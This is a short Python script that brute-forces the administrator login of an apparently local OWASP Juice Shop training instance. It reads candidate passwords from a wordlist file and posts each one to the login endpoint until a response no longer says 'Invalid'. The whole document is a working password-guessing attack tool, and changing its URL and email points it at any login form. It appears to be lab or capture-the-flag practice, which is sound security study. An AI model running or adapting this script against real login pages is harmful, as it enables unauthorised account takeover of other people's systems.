import requests
import sys

def main():
    url = 'http://localhost:3000/rest/user/login'
    filename = sys.argv[1]

    #Open the bruteforce file for reading
    f = open(filename, 'r')

    lines = f.readlines()

    for line in lines:
        post_data = {'email': 'admin@juice-sh.op', 'password': line[0 : len(line) - 1],}

        response = requests.post(url, json=post_data)
    
        #Status 401 is Unauthorized
        if "Invalid" not in response.text:
            print("[+] Found password: {}".format(line))

            break

        print("[*] Trying password: {}".format(line))

if __name__ == "__main__":
    main()
